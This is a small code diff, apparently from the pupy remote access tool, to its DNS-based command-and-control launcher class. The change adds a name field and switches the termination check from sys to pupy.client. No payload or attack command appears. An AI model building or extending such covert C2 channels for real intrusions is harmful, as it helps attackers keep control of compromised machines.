@@ -195,6 +195,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
 
+    name = 'dnscnc'
     credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
@@ -261,12 +262,12 @@ class DNSCncLauncher(BaseLauncher):
 
 
     def iterate(self):
-        import sys
+        import pupy
 
         if not self.dnscnc:
             self.activate()
 
-        while not self.exited and not sys.terminated:
+        while not self.exited and not pupy.client.terminated:
             try:
                 connection = self.process()
                 if not connection:
